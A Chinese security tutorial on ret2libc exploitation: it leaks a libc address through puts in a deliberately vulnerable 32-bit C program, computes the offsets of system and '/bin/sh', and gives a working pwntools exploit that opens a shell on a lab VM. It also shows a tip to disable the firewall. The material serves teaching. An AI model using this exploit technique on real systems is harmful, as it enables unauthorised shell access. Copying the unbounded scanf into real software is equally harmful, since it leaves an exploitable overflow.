上次写过一篇文章[《第一个PWN：栈溢出原理以及EXP的编写》](https://www.freebuf.com/articles/system/253225.html)，希望大家完全搞明白并自己动手尝试后再来学习此篇文章，这样会受益良多

## 准备

虚拟机：centOS 6.8 32bit, gcc, socat  
宿主机：IDA7.0, Python + pwntools

> 略有小坑，当宿主机IDA连接不到centOS时，请关闭centOS的防火墙`service iptables stop`

## 实验代码

上次我们为了降低利用难度，在程序中预留了一个system函数，那我们也得出，如果要获得系统中的shell权限，那么就必须有两个条件`system`函数和参数`/bin/sh`。

    
    
    //stack_overflow.c
    #include <stdio.h>
    
    // 这是存在栈溢出的函数
    void stack_overflow()
    {
            char buf[64] = {0};
            scanf("%s", &buf); //将输入的数据读入buf中
            printf("Hello %s\n", &buf); //打印出buf中的内容
    }
    
    // 程序入口
    void main()
    {
            puts("PWN2!");
            stack_overflow();
    }
    

## 如何 getshell 分析

GCC默认参数编译后用`checksec`（安装pwntools自带）检查下程序的保护机制，发现只是默认开启了NX栈执行保护，也就是说我们不能直接将shellcode插入栈中去执行。

![](https://image.3001.net/images/20201123/1606096219_5fbb155b2cae940fa8a84.jpg!small)  
我们查看了.got中也没有发现有system函数，因为我们程序中本来就没用用到，当然没有了

还有一种方法，我们看能不能使用`int
0x80`的方式来直接调用系统调用（有关此类可以查阅相关资料，后边再详细讲，这里是一种思路），执行完下面的语句后发现并没有这个语句。

    
    
    ropgadget --binary stack_overflow2| grep "int 0x80"

那程序中没办法调system，没有`/bin/sh`就没办法了吗？还有办法！不然我这文章就没办法继续往下写了。我们知道上述代码，包含了标准库`stdio.h`，引入了`printf`和`scanf`函数。那么这些函数从哪里来呢？那么就要涉及到程序的动态链接库里，没错在windows下，就是大家所熟知的`.dll`文件，在Linux下动态链接库就是`.so`文件。此程序的运行也是用到了动态链接库`libc.so`，那么我们看看能不能在`libc.so`寻找点东西。

### getshell的思路

那么我们在libc.so中找找看有没有我们想要的字符串，经过查找，发现还真有，但是动态库每次加载的地址是不一样的，那怎么获得其真正的地址呢？答案是通过偏移，虽然动态库每次加载的地址不一样，但是他相对它本身来说，偏移是相同的。

![](https://image.3001.net/images/20201123/1606099152_5fbb20d02fe4f2cef73cb.jpg!small)

我们可以将libc_2.12.so拿出来直接查看他的偏移，或者我们直接来计算下他的偏移是多少，如图，用该字符串的Address减去libc.so的Base，结果是0x156B65

![](https://image.3001.net/images/20201123/1606099168_5fbb20e0da12fabb2acd9.jpg!small)那么就剩system，system该怎么获得呢？既然是库函数
libc 中当然也有了，同样的，我们查阅下，然后计算他的偏移，0xDF6F00-0xDBC000等于0x3AF00

![](https://image.3001.net/images/20201123/1606099242_5fbb212a438338e30da02.jpg!small)

这两个大问题解决了，剩下的是如何获取加载地址了。常用的方法是采用got表泄漏，即输出某个函数对应的got表项的内容，但要注意只有执行过的函数才会与libc绑定。这里我们泄露
`__libc_start_main`的地址，程序运行时首先会执行它。

### 调试分析

总结下上述，整理思路，我们的流程是这样的

  * 泄露 __libc_start_main 地址
  * 获取 system 和 /bin/sh 地址
  * 再次执行源程序
  * 触发栈溢出执行 system('/bin/sh')

那么首先我们通过如下payload来获得 system和 /bin/sh的地址

    
    
    from pwn import *
    io = remote("172.16.177.203", 9999)
    elf = ELF("./stack_overflow2")
    puts_plt = elf.plt['puts']
    libc_start_main_got = elf.got['__libc_start_main']
    libc_start_main_offset = 0x16c40   # 这是libc_start_main的偏移
    fun_stack_overflow = elf.symbols['stack_overflow']
    
    # fun_stack_overflow 是返回地址
    payload = b'A'*0x4c + p32(puts_plt) + p32(fun_stack_overflow) + p32(libc_start_main_got)
    io.sendlineafter('PWN2!', payload)
    io.recvuntil(p32(libc_start_main_got)+b'\n') #过滤前边的输出
    real_libc_start_main_addr = u32(io.recv()[:-1].ljust(4, b'\0'))
    libc_base = real_libc_start_main_addr - libc_start_main_offset  # libc的起始地址
    
    system_addr = libc_base + 0x3AF00
    binsh_addr = libc_base + 0x156B65

上边，我们使用ROP通过构造，第一遍执行stack_overflow()子函数。由于我们构造的Payload中返回地址还是stack_overflow()函数，所以下图是我们看到第二遍来到该函数的截图。我们计算下他的Padding，0xBFB7D384-0xBFB7D338等于0x4C，和上边一样。

![](https://image.3001.net/images/20201123/1606099292_5fbb215cc6aeebc692d56.jpg!small)接下来我们有了前置条件，继续构造Payload

    
    
    payload = b'A'*0x4C + p32(system_addr) + p32(0) + p32(binsh_addr)
    io.sendline(payload)
    io.interactive()

如下图，我们利用成功。

![](https://image.3001.net/images/20201123/1606099323_5fbb217b4abae34af4612.jpg!small)

## 小结

虽然整个篇幅没有解释ROP，那么现在大家应该明白ROP是什么意思了，说白了就是我不断的修改Ret要跳转的地址，然后组成这样的一个链，叫做面向Return的编程，搞这行的前辈们翻译作“返回式导向编程”，其实就这意思。

